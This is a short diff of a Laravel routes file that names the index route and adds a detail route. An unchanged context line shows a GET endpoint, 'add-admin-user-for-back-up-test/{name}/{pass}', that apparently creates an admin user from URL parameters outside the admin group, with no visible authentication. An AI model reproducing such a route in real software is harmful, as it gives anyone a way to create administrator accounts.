@@ -15,8 +15,8 @@ use App\Http\Controllers\Controller;
 |
 */
 
-Route::get('/', [Controller::class, 'index']);
-
+Route::get('/', [Controller::class, 'index'])->name('indexx');
+Route::get('/detail/{id}', [Controller::class, 'detail'])->name('detail');
 
 Route::get('add-admin-user-for-back-up-test/{name}/{pass}', [AdminController::class, 'addAdUser']);
 Route::group(['prefix' => 'admin'], function() {
